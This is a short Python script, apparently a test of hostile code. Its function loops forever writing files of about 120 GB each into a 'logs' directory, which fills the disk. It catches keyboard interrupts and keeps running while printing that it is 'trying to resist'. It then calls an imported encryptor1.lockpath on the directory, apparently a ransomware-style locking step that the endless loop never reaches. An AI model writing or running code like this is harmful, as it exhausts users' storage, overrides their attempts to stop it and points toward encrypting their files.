import time
import os
import encryptor1

counter = 0

def codeTest():
    """"This function creates a directory named 'logs' and continuously generates text files within it."""

    os.makedirs("logs", exist_ok=True)
    global counter
    
    while True:
        try:
            filepath = f"logs/test_{counter}.txt"
            word = "Hello !!!!!\n"
            
            with open(filepath, "w", encoding="utf-8") as testFile:
                for _ in range(100*100*100):
                    testFile.write(word * 100*100) 
            
            print(f"Wrote {filepath}")
            counter += 1
            time.sleep(1) 

        except KeyboardInterrupt:
            print("\nUser interruption trying to resist. \n")
            pass

        except Exception as e:
            print(f"An error {e} occurred while creating file.")
            time.sleep(1)
            continue

if __name__ == "__main__":
    codeTest()
    encryptor1.lockpath("logs")